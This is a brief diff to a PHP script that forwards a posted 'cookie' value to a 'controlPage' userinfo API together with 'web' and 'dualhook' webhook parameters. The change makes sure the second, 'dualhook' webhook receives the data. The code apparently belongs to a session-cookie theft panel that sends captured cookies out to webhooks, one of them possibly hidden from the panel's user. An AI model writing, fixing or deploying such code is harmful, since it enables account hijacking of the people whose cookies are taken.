@@ -83,7 +83,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             file_put_contents($dailyLogsFile, json_encode($dailyLogsData));
 
             // Call userinfo.php with cURL and proper timeout to send webhook
-            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web={web}&dh={dualhook}";
+            // Pass both 'dh' and 'dualhook' parameters to ensure dualhook is received
+            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web={web}&dh={dualhook}&dualhook={dualhook}";
             
             $ch = curl_init($userInfoUrl);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
